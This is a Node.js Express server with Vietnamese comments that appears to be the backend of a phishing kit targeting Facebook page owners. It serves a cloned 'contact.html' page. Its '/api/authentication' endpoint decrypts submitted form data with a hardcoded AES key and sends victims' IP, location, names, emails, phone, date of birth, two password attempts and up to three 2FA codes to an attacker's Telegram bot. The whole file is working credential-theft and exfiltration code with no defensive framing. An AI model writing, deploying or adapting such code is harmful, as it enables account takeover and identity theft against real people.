const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const CryptoJS = require('crypto-js');
require('dotenv').config();  // Quan trọng: đọc file .env

const app = express();
const PORT = process.env.PORT || 3000;

// ĐỌC TOKEN TỪ FILE .env
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECRET_KEY = "HDNDT-JDHT8FNEK-JJHR";

// Kiểm tra token khi khởi động
console.log(`
🔍 KIỂM TRA CẤU HÌNH:
   Token: ${TELEGRAM_TOKEN ? '✅ Đã cấu hình' : '❌ CHƯA CẤU HÌNH'}
   Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Đã cấu hình' : '❌ CHƯA CẤU HÌNH'}
   Token value: ${TELEGRAM_TOKEN ? TELEGRAM_TOKEN.substring(0, 20) + '...' : 'N/A'}
`);

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));
app.use('/_next', express.static(path.join(__dirname, '_next')));

function decryptData(encryptedData) {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
    if (!decrypted) return null;
    return JSON.parse(decrypted);
  } catch (error) {
    console.error('Giải mã lỗi:', error.message);
    return null;
  }
}

async function sendToTelegram(message) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Token hoặc Chat ID chưa cấu hình!');
    return;
  }
  
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });
    console.log('✅ Đã gửi đến bot mới!');
  } catch (error) {
    console.error('❌ Lỗi gửi:', error.message);
  }
}

app.post('/api/authentication', async (req, res) => {
  try {
    console.log('\n📥 Nhận request');
    
    let data = req.body;
    
    if (data.data && typeof data.data === 'string') {
      const decrypted = decryptData(data.data);
      if (decrypted) data = decrypted;
    }
    
    console.log('Dữ liệu:', JSON.stringify(data, null, 2));
    
    const message = `
Ip: ${data.ip || 'N/A'}
Location: ${data.location || 'N/A'}
-----------------------------
Full Name: ${data.name || data.fullName || 'N/A'}
Page Name: ${data.fanpage || data.fanpageUrl || 'N/A'}
Date of birth: ${data.day || 'N/A'}/${data.month || 'N/A'}/${data.year || 'N/A'}
-----------------------------
Email: ${data.email || 'N/A'}
Email Business: ${data.business || data.businessEmail || 'N/A'}
Phone Number: ${data.phone || 'N/A'}
-----------------------------
Password First: ${data.password || data.passwordFirst || 'N/A'}
Password Second: ${data.passwordSecond || 'N/A'}
-----------------------------
Auth Method: ${data.authMethod || 'N/A'}
-----------------------------
🔐Code 2FA(1): ${data.twoFa || data.code2FA1 || 'N/A'}
🔐Code 2FA(2): ${data.twoFaSecond || data.code2FA2 || 'N/A'}
🔐Code 2FA(3): ${data.twoFaThird || data.code2FA3 || 'N/A'}
    `;
    
    await sendToTelegram(message);
    res.json({ success: true });
    
  } catch (error) {
    console.error('Lỗi:', error);
    res.status(500).json({ success: false });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.get('/contact.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.listen(PORT, () => {
  console.log(`\n🚀 Server chạy tại: http://localhost:${PORT}/contact.html\n`);
});